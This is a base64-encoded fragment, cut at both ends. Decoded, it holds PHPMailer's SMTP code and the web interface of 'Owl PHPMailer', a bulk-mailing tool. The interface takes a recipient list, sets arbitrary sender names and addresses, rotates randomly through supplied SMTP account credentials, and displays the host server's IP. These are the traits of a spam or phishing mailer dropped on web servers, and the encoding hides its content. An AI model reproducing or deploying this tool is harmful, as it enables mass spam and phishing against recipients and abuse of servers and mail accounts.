yaW5nCiAgICovCiAgcHJvdGVjdGVkIGZ1bmN0aW9uIHJlY29yZExhc3RUcmFuc2FjdGlvbklEKCkKICB7CiAgICAkcmVwbHkgPSAkdGhpcy0+Z2V0TGFzdFJlcGx5KCk7CiAgICBpZiAoZW1wdHkoJHJlcGx5KSkgewogICAgICAkdGhpcy0+bGFzdF9zbXRwX3RyYW5zYWN0aW9uX2lkID0gbnVsbDsKICAgIH0gZWxzZSB7CiAgICAgICR0aGlzLT5sYXN0X3NtdHBfdHJhbnNhY3Rpb25faWQgPSBmYWxzZTsKICAgICAgZm9yZWFjaCAoJHRoaXMtPnNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybnMgYXMgJHNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybikgewogICAgICAgIGlmIChwcmVnX21hdGNoKCRzbXRwX3RyYW5zYWN0aW9uX2lkX3BhdHRlcm4sICRyZXBseSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAkdGhpcy0+bGFzdF9zbXRwX3RyYW5zYWN0aW9uX2lkID0gdHJpbSgkbWF0Y2hlc1sxXSk7CiAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgIH0KICAgIH0KICAgIHJldHVybiAkdGhpcy0+bGFzdF9zbXRwX3RyYW5zYWN0aW9uX2lkOwogIH0KICAvKioKICAgKiBHZXQgdGhlIHF1ZXVlL3RyYW5zYWN0aW9uIElEIG9mIHRoZSBsYXN0IFNNVFAgdHJhbnNhY3Rpb24KICAgKiBJZiBubyByZXBseSBoYXMgYmVlbiByZWNlaXZlZCB5ZXQsIGl0IHdpbGwgcmV0dXJuIG51bGwuCiAgICogSWYgbm8gcGF0dGVybiB3YXMgbWF0Y2hlZCwgaXQgd2lsbCByZXR1cm4gZmFsc2UuCiAgICoKICAgKiBAcmV0dXJuIGJvb2x8bnVsbHxzdHJpbmcKICAgKgogICAqIEBzZWUgcmVjb3JkTGFzdFRyYW5zYWN0aW9uSUQoKQogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBnZXRMYXN0VHJhbnNhY3Rpb25JRCgpCiAgewogICAgcmV0dXJuICR0aGlzLT5sYXN0X3NtdHBfdHJhbnNhY3Rpb25faWQ7CiAgfQp9CgoKCgoKLyoqCiAqIFBIUE1haWxlciBleGNlcHRpb24gaGFuZGxlcgogKiBAcGFja2FnZSBQSFBNYWlsZXIKICovCmNsYXNzIHBocG1haWxlckV4Y2VwdGlvbiBleHRlbmRzIEV4Y2VwdGlvbgp7CiAgICAvKioKICAgICAqIFByZXR0aWZ5IGVycm9yIG1lc3NhZ2Ugb3V0cHV0CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZXJyb3JNZXNzYWdlKCkKICAgIHsKICAgICAgICAkZXJyb3JNc2cgPSAnPHN0cm9uZz4nIC4gJHRoaXMtPmdldE1lc3NhZ2UoKSAuICI8L3N0cm9uZz48YnIgLz5cbiI7CiAgICAgICAgcmV0dXJuICRlcnJvck1zZzsKICAgIH0KfQoKCgo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRSA9IGVkZ2UiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aCA9IGRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZSA9IDEiPgogIDx0aXRsZT5Pd2wgUEhQTWFpbGVyIDw/cGhwIGVjaG8gJG93bFsndmVyc2lvbiddPz48L3RpdGxlPgogIDxsaW5rIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN3YXRjaC8zLjMuNi9jb3Ntby9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8bGluayBocmVmPSJodHRwczovL293bG1haWxlci5pby9jc3MvYm9vdHN0cmFwLTMuMy4xLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPCEtLSBqUXVlcnkgKG5lY2Vzc2FyeSBmb3IgQm9vdHN0cmFwJ3MgSmF2YVNjcmlwdCBwbHVnaW5zKSAtLT4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMy4zLjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzMuMy4xL2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgogIDxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly9vd2xtYWlsZXIuaW8vaW1nL2Zhdmljb24uaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+CgoKPC9oZWFkPgoKPGJvZHk+CiAgICA8c2NyaXB0PgogICAgICAgIHZhciBydW5uaW5nID0gZmFsc2U7CiAgICAgICAgdmFyIHJlcXVlc3Q7CiAgICA8L3NjcmlwdD4KCiAgPHNjcmlwdD4KICAgIEFycmF5LnByb3RvdHlwZS5yYW5kb21FbGVtZW50ID0gZnVuY3Rpb24gKCkgewogIHJldHVybiB0aGlzW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIHRoaXMubGVuZ3RoKV0KIH0KCiBmdW5jdGlvbiBzdG9wU2VuZGluZygpCiB7CiAgICBydW5uaW5nID0gZmFsc2U7CgogICAgaWYgKHJlcXVlc3QpIHsKICAgICAgICByZXF1ZXN0LmFib3J0KCk7CiAgICAgIH0KCiAgICAkKCIjYnRuU3RhcnQiKS5hdHRyKCJkaXNhYmxlZCIsIGZhbHNlKTsKICAgICQoIiNidG5TdG9wIikuYXR0cigiZGlzYWJsZWQiLCB0cnVlKTsKIH0KCiBmdW5jdGlvbiBoYW5kbGVTZW5kaW5nUmVzcG9uc2UocmVjaXBpZW50LCByZXNwb25zZSwgcHJvY2Vzc2VkQ291bnQsIHRvdGFsRW1haWxDb3VudCkgewogICQoIiNwcm9ncmVzcyIpLmFwcGVuZCgnPGRpdiBjbGFzcz0iY29sLWxnLTMiPicgKyBwcm9jZXNzZWRDb3VudC50b1N0cmluZygpICsgJy8nICsgdG90YWxFbWFpbENvdW50LnRvU3RyaW5nKCkgKyAnPC9kaXY+PGRpdiBjbGFzcz0iY29sLWxnLTYiPicgKyByZWNpcGllbnQgKyAnPC9kaXY+Jyk7CiAgCiAgaWYgKHJlc3BvbnNlID09ICJPSyIpewogICAgJCgiI3Byb2dyZXNzIikuYXBwZW5kKCc8ZGl2IGNsYXNzPSJjb2wtbGctMSI+PHNwYW4gY2xhc3M9ImxhYmVsIGxhYmVsLXN1Y2Nlc3MiPk9rPC9zcGFuPjwvZGl2PicpOwogIH0KICBlbHNlIGlmKHJlc3BvbnNlID09ICJJbmNvcnJlY3QgRW1haWwiKXsKICAgICQoIiNwcm9ncmVzcyIpLmFwcGVuZCgnPGRpdiBjbGFzcz0iY29sLWxnLTEiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1kZWZhdWx0Ij5JbmNvcnJlY3QgRW1haWw8L3NwYW4+PC9kaXY+Jyk7CiAgfSBlbHNlIHsKICAgICQoIiNwcm9ncmVzcyIpLmFwcGVuZCgnPGRpdiBjbGFzcz0iY29sLWxnLTEiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1kZWZhdWx0Ij4nICsgcmVzcG9uc2UgKyAnPC9zcGFuPjwvZGl2PicpOwogIH0KICAkKCIjcHJvZ3Jlc3MiKS5hcHBlbmQoJzxicj4nKTsKIH0KCiBmdW5jdGlvbiBzdGFydFNlbmRpbmcoKSB7CgogCgogIHZhciBlTWFpbFRleHRBcmVhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImVtYWlsTGlzdCIpOwogIHZhciBlTWFpbFRleHRBcmVhTGluZXMgPSBlTWFpbFRleHRBcmVhLnZhbHVlLnNwbGl0KCJcbiIpOwogIHZhciBzbXRwQWNjb3VudHNUZXh0QXJlYSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzbXRwQWNjb3VudHMiKTsKICB2YXIgc210cEFjY291bnRzVGV4dEFyZWFMaW5lcyA9IHNtdHBBY2NvdW50c1RleHRBcmVhLnZhbHVlLnNwbGl0KCJcbiIpOwogIHZhciBlbmNvZGluZ1R5cGVFID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2VuY29kaW5nJyk7CiAgdmFyIGVuY29kaW5nVHlwZSA9IGVuY29kaW5nVHlwZUUub3B0aW9uc1tlbmNvZGluZ1R5cGVFLnNlbGVjdGVkSW5kZXhdLnZhbHVlOwogIHZhciBlbWFpbFByaW9yaXR5RSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcmlvcml0eScpOwogIHZhciBlbWFpbFByaW9yaXR5ID0gZW1haWxQcmlvcml0eUUub3B0aW9uc1tlbWFpbFByaW9yaXR5RS5zZWxlY3RlZEluZGV4XS52YWx1ZTsKIAogICB2YXIgZm9ybV9kYXRhID0gbmV3IEZvcm1EYXRhKCk7CiAgIGZvcm1fZGF0YS5hcHBlbmQoImFjdGlvbiIsICJzZW5kIik7CiAgIGZvcm1fZGF0YS5hcHBlbmQoInNlbmRpbmdNZXRob2QiLCBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJzZW5kaW5nTWV0aG9kIl06Y2hlY2tlZCcpLnZhbHVlKTsKICAgZm9ybV9kYXRhLmFwcGVuZCgic2VuZGVyRW1haWwiLCBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2VuZGVyRW1haWwnKS52YWx1ZSk7CiAgIGZvcm1fZGF0YS5hcHBlbmQoInNlbmRlck5hbWUiLCBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2VuZGVyTmFtZScpLnZhbHVlKTsKICAgZm9ybV9kYXRhLmFwcGVuZCgicmVwbHlUbyIsIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXBseVRvJykudmFsdWUpOwogICBmb3JtX2RhdGEuYXBwZW5kKCJtZXNzYWdlU3ViamVjdCIsIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdWJqZWN0JykudmFsdWUpOwogICBmb3JtX2RhdGEuYXBwZW5kKCJtZXNzYWdlTGV0dGVyIiwgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21lc3NhZ2VMZXR0ZXInKS52YWx1ZSk7CiAgIGZvcm1fZGF0YS5hcHBlbmQoImFsdE1lc3NhZ2VMZXR0ZXIiLCBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYWx0TWVzc2FnZUxldHRlcicpLnZhbHVlKTsKICAgZm9ybV9kYXRhLmFwcGVuZCgibWVzc2FnZVR5cGUiLCBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJtZXNzYWdlVHlwZSJdOmNoZWNrZWQnKS52YWx1ZSk7CiAgIGZvcm1fZGF0YS5hcHBlbmQoImVuY29kaW5nVHlwZSIsIGVuY29kaW5nVHlwZSk7CiAgIGZvcm1fZGF0YS5hcHBlbmQoImVtYWlsUHJpb3JpdHkiLCBlbWFpbFByaW9yaXR5KTsKCiAgIGZvciAodmFyIHggPSAwOyB4IDwgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F0dGFjaG1lbnQnKS5maWxlcy5sZW5ndGg7IHgrKykgewogICAgICBmb3JtX2RhdGEuYXBwZW5kKCJhdHRhY2htZW50W10iLCBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXR0YWNobWVudCcpLmZpbGVzW3hdKTsKICAgfQoKICAkKCIjcHJvZ3Jlc3MiKS5lbXB0eSgpOwogIHZhciBwcm9jZXNzZWRDb3VudCA9IDA7CiAgJChmdW5jdGlvbiAoKSB7CiAgICB2YXIgaSA9IDA7CiAgICBydW5uaW5nID0gdHJ1ZTsKCiAgICAkKCIjYnRuU3RhcnQiKS5hdHRyKCJkaXNhYmxlZCIsIHRydWUpOwogICAgJCgiI2J0blN0b3AiKS5hdHRyKCJkaXNhYmxlZCIsIGZhbHNlKTsKCgogICAgZnVuY3Rpb24gbmV4dENhbGwoKSB7CiAgICAgIGlmIChpID09IGVNYWlsVGV4dEFyZWFMaW5lcy5sZW5ndGgpewoKICAgICAgICAgJCgiI2J0blN0YXJ0IikuYXR0cigiZGlzYWJsZWQiLCBmYWxzZSk7CiAgICAgICAgICQoIiNidG5TdG9wIikuYXR0cigiZGlzYWJsZWQiLCB0cnVlKTsKICAgICAgICAgcmV0dXJuOyAvL2xhc3QgY2FsbCB3YXMgbGFzdCBpdGVtIGluIHRoZSBhcnJheQogICAgICB9CgogICAgICAvLyBBYm9ydCBhbnkgcGVuZGluZyByZXF1ZXN0CiAgICAgIGlmIChyZXF1ZXN0KSB7CiAgICAgICAgcmVxdWVzdC5hYm9ydCgpOwogICAgICB9CiAgICAgICBpZighcnVubmluZykKICAgICAgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgdmFyIHJlY2lwaWVudCA9IGVNYWlsVGV4dEFyZWFMaW5lc1tpKytdCiAgICAgIGZvcm1fZGF0YS5hcHBlbmQoInJlY2lwaWVudCIsIHJlY2lwaWVudCk7CiAgICAgIGZvcm1fZGF0YS5hcHBlbmQoInNtdHBBY2N0Iiwgc210cEFjY291bnRzVGV4dEFyZWFMaW5lcy5yYW5kb21FbGVtZW50KCkpOwoKICAgICAgcmVxdWVzdCA9ICQuYWpheCh7CiAgICAgICAgdHlwZTogInBvc3QiLAogICAgICAgIGRhdGE6IGZvcm1fZGF0YSwKICAgICAgICBjb250ZW50VHlwZTogZmFsc2UsCiAgICAgICAgcHJvY2Vzc0RhdGE6IGZhbHNlLAogICAgICB9KTsKICAgICAgLy8gQ2FsbGJhY2sgaGFuZGxlciB0aGF0IHdpbGwgYmUgY2FsbGVkIG9uIHN1Y2Nlc3MKICAgICAgcmVxdWVzdC5kb25lKGZ1bmN0aW9uIChyZXNwb25zZSwgdGV4dFN0YXR1cywganFYSFIpIHsKICAgICAgICBwcm9jZXNzZWRDb3VudCArPSAxOwogICAgICAgIGhhbmRsZVNlbmRpbmdSZXNwb25zZShyZWNpcGllbnQsIHJlc3BvbnNlLCBwcm9jZXNzZWRDb3VudCwgZU1haWxUZXh0QXJlYUxpbmVzLmxlbmd0aCk7CiAgICAgICAgbmV4dENhbGwoKTsKICAgICAgfSk7CiAgICB9CiAgICBuZXh0Q2FsbCgpOwogIH0pOwogfQo8L3NjcmlwdD4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIgY29sLWxnLTYiPgogICAgPGgzPiYjMTI5NDE3OyBPd2wgUEhQTWFpbGVyPHNtYWxsPiA8P3BocCBlY2hvICRvd2xbJ3ZlcnNpb24nXT8+PC9zbWFsbD48L2gzPgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPgogICAgICAgIDxsYWJlbCBmb3I9InNlbmRlckVtYWlsIj5TZW5kZXIgRW1haWw8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sICBpbnB1dC1zbSIgaWQ9InNlbmRlckVtYWlsIiBuYW1lPSJzZW5kZXJFbWFpbCI+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICI+CiAgICAgICAgPGxhYmVsIGZvcj0ic2VuZGVyRW1haWwiPlNlbmRlciBOYW1lPC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20iIGlkPSJzZW5kZXJOYW1lIiBuYW1lPSJzZW5kZXJOYW1lIj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9InJvdyI+IDxzcGFuIGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJhdHRhY2htZW50Ij5BdHRhY2htZW50IDxzbWFsbD4oTXVsdGlwbGUgQXZhaWxhYmxlKTwvc21hbGw+PC9sYWJlbD48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iYXR0YWNobWVudFtdIiBpZD0iYXR0YWNobWVudCIgbXVsdGlwbGUvPjwvc3Bhbj4KICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiI+CiAgICAgICAgPGxhYmVsIGZvcj0icmVwbHlUbyI+UmVwbHktdG88L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sICBpbnB1dC1zbSAiIGlkPSJyZXBseVRvIiBuYW1lPSJyZXBseVRvIiAvPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctMTIgIj4KICAgICAgICA8bGFiZWwgZm9yPSJzdWJqZWN0Ij5TdWJqZWN0PC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic3ViamVjdCIgbmFtZT0ic3ViamVjdCIgLz4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYiPgogICAgICAgIDxsYWJlbCBmb3I9Im1lc3NhZ2VMZXR0ZXIiPk1lc3NhZ2UgTGV0dGVyPC9sYWJlbD4KICAgICAgICA8dGV4dGFyZWEgcGxhY2Vob2xkZXI9Ik1lc3NhZ2UgTGV0dGVyIiBuYW1lPSJtZXNzYWdlTGV0dGVyIiBpZD0ibWVzc2FnZUxldHRlciIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+PC90ZXh0YXJlYT4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYiPgogICAgICAgIDxsYWJlbCBmb3I9ImFsdE1lc3NhZ2VMZXR0ZXIiPkFsdGVybmF0aXZlIE1lc3NhZ2UgTGV0dGVyPC9sYWJlbD4KICAgICAgICA8dGV4dGFyZWEgcGxhY2Vob2xkZXI9IkFsdGVybmF0aXZlIE1lc3NhZ2UgTGV0dGVyLiYjMTA7VGhpcyBib2R5IGNhbiBiZSByZWFkIGJ5IG1haWwgY2xpZW50cyB0aGF0IGRvIG5vdCBoYXZlIEhUTUwgZW1haWwuJiMxMDtjYXBhYmlsaXR5IHN1Y2ggYXMgbXV0dCAmIzM4OyBFdWRvcmEuJiMxMDtDbGllbnRzIHRoYXQgY2FuIHJlYWQgSFRNTCB3aWxsIHZpZXcgdGhlIG5vcm1hbCBCb2R5LiIgbmFtZT0iYWx0TWVzc2FnZUxldHRlciIgaWQ9ImFsdE1lc3NhZ2VMZXR0ZXIiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjEwIiBpZD0idGV4dEFyZWEiPjwvdGV4dGFyZWE+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICI+CiAgICAgICAgPGxhYmVsIGZvcj0iZW1haWxMaXN0Ij5FbWFpbCBMaXN0PC9sYWJlbD4KICAgICAgICA8dGV4dGFyZWEgbmFtZT0iZW1haWxMaXN0IiBpZD0iZW1haWxMaXN0IiBjbGFzcz0iZm9ybS1jb250cm9sIiByb3dzPSIxMCIgaWQ9InRleHRBcmVhIj48L3RleHRhcmVhPgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPgogICAgICAgIDxsYWJlbCBmb3I9InNtdHBBY2NvdW50cyI+U01UUCBBY2NvdW50czwvbGFiZWw+CiAgICAgICAgPHRleHRhcmVhIHBsYWNlaG9sZGVyPSJSYW5kb20gYWNjb3VudCB3aWxsIGJlIHVzZWQgd2hlbiBzZW5kaW5nIGEgbWVzc2FnZS4mIzEwOzEpIEZvcm1hdDogSE9TVDpQT1JUOlNTTCYjMTA7MikgRm9ybWF0OiBIT1NUOlBPUlQ6U1NMOlVzZXJuYW1lOlBhc3N3b3JkJiMxMDtFeGFtcGxlOiBzbXRwLmdtYWlsLmNvbTo1ODc6dGxzOnh4QGdtYWlsLmNvbToxMjMmIzEwO0V4YW1wbGU6IHNtdHAuZ21haWwuY29tOjU4Nzpub3NzbDp4eEBnbWFpbC5jb206MTIzJiMxMDsmIzEwO1NTTCBPcHRpb25zOiB0bHMgLCBzc2wsIG5vc3NsIiBuYW1lPSJzbXRwQWNjb3VudHMiIGlkPSJzbXRwQWNjb3VudHMiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjEwIiBpZD0idGV4dEFyZWEiPjwvdGV4dGFyZWE+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPgogICAgICA8bGFiZWwgZm9yPSJtZXNzYWdlVHlwZSI+TWVzc2FnZSBUeXBlPC9sYWJlbD4KICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJtZXNzYWdlVHlwZSIgaWQ9Im1lc3NhZ2VUeXBlIiB2YWx1ZT0iaHRtbCIgY2hlY2tlZD4gSFRNTAogICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9Im1lc3NhZ2VUeXBlIiBpZD0ibWVzc2FnZVR5cGUiIHZhbHVlPSJwbGFpbiI+IFBsYWluCiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj4KICAgICAgPGxhYmVsIGZvcj0ic2VuZGluZ01ldGhvZCI+U2VuZGluZyBNZXRob2Q8L2xhYmVsPgogICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InNlbmRpbmdNZXRob2QiIGlkPSJzZW5kaW5nTWV0aG9kIiB2YWx1ZT0iYnVpbHRpbiIgY2hlY2tlZD4gQnVpbHRpbgogICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InNlbmRpbmdNZXRob2QiIGlkPSJzZW5kaW5nTWV0aG9kIiB2YWx1ZT0ic210cCI+IFNNVFAKICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiI+CiAgICAgIDxsYWJlbCBmb3I9ImVuY29kaW5nIj5FbmNvZGluZyBUeXBlPC9sYWJlbD4KICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1jb250cm9sIGlucHV0LXNtIiBpZD0iZW5jb2RpbmciIG5hbWU9ImVuY29kaW5nIj4KICAgICAgICA8b3B0aW9uIHZhbHVlPSJVVEYtOCIgc2VsZWN0ZWQ+VVRGLTggSW50ZXJuYXRpb25hbCBVbmljb2RlPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iSVNPLTg4NTktMSI+SVNPLTg4NTktMSBMYXRpbiAxIChXZXN0IEV1cm9wZWFuKTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9IklTTy04ODU5LTIiPklTTy04ODU5LTIgTGF0aW4gMiAoRWFzdCBFdXJvcGVhbik8L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPSJJU08tODg1OS0zIj5JU08tODg1OS0zIExhdGluIDMgKFNvdXRoIEV1cm9wZWFuKTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9IklTTy04ODU5LTQiPklTTy04ODU5LTQgTGF0aW4gNCAoTm9ydGggRXVyb3BlYW4pPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iSVNPLTg4NTktNSI+SVNPLTg4NTktNSBDeXJpbGxpYzwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9IklTTy04ODU5LTYiPklTTy04ODU5LTYgQXJhYmljPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iSVNPLTg4NTktNyI+SVNPLTg4NTktNyBHcmVlazwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9IklTTy04ODU5LTgiPklTTy04ODU5LTggSGVicmV3PC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iSVNPLTg4NTktOSI+SVNPLTg4NTktOSBMYXRpbiA1IChUdXJraXNoKTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9IklTTy04ODU5LTE1Ij5JU08tODg1OS0xNSBMYXRpbiA5PC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iQklHNSI+QklHNSBUcmFkaXRpb25hbCBDaGluZXNlPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iR0ItMjMxMiI+R0ItMjMxMiBTaW1wbGlmaWVkIENoaW5lc2U8L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPSJJU08tMjAyMi1KUCI+SVNPLTIwMjItSlAgSmFwYW5lc2U8L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPSJFVUMtSlAiPkVVQy1KUCBKYXBhbmVzZTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9IlNoaWZ0LUpJUyI+U2hpZnQtSklTIEphcGFuZXNlPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iS1NDLTU2MDEiPktTQy01NjAxIEtvcmVhbjwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9IkVJQy1LUiI+RUlDLUtSIEtvcmVhbjwvb3B0aW9uPgogICAgICA8L3NlbGVjdD4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctMyI+CiAgICAgIDxsYWJlbCBmb3I9InByaW9yaXR5Ij5FbWFpbCBQcmlvcml0eTwvbGFiZWw+CiAgICAgIDxzZWxlY3QgY2xhc3M9ImZvcm0tY29udHJvbCBpbnB1dC1zbSIgaWQ9InByaW9yaXR5IiBuYW1lPSJwcmlvcml0eSI+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iIiBzZWxlY3RlZD5EZWZhdWx0PC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iNSI+TG93PC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iMyI+Tm9ybWFsPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iMSI+SGlnaDwvb3B0aW9uPgogICAgICA8L3NlbGVjdD4KICAgIDwvZGl2PgogIDwvZGl2PgoKPGJ1dHRvbiB0eXBlPSJidXR0b24iIGlkPSJidG5TdGFydCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20iIG9uY2xpY2s9InN0YXJ0U2VuZGluZygpOyI+U3RhcnQ8L2J1dHRvbj4KPGJ1dHRvbiB0eXBlPSJidXR0b24iaWQ9ImJ0blN0b3AiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXNtIiBvbmNsaWNrPSJzdG9wU2VuZGluZygpOyI+U3RvcDwvYnV0dG9uPgoKPC9kaXY+CiAgCiAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNiI+PGJyPgogICAgICAgIDxsYWJlbCBmb3I9IndlbGwiPkluc3RydWN0aW9uPC9sYWJlbD4KICAgICAgICA8ZGl2IGlkPSJ3ZWxsIiBjbGFzcz0id2VsbCB3ZWxsIj4KICAgICAgICAgICAgPGg0PlNlcnZlciBJbmZvcm1hdGlvbjwvaDQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT5TZXJ2ZXJJUCA6IDxiPiA8P3BocCBlY2hvICRfU0VSVkVSWydTRVJWRVJfQUREUiddID8+PC9iPjwvbGk+CgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8aDQ+SEVMUDwvaDQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT5bLWVtYWlsLV0gOiA8Yj5SZWNpdmVyIEVtYWlsPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy10aW1lLV0gOiA8Yj5EYXRlIGFuZCBUaW1lPC9iPiAoPD9waHAgZWNobyBkYXRlKCJtL2QvWSBoOmk6cyBhIiwgdGltZSgpKSA/Pik8L2xpPgogICAgICAgICAgICAgICAgPGxpPlstZW1haWx1c2VyLV0gOiA8Yj5FbWFpbCBVc2VyPC9iPiAoZW1haWx1c2VyQGVtYWlsZG9tYWluKTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21zdHJpbmctXSA6IDxiPlJhbmRvbSBzdHJpbmcgKDAtOSxhLXopPC9iPjwvbGk+CiAgICAgIC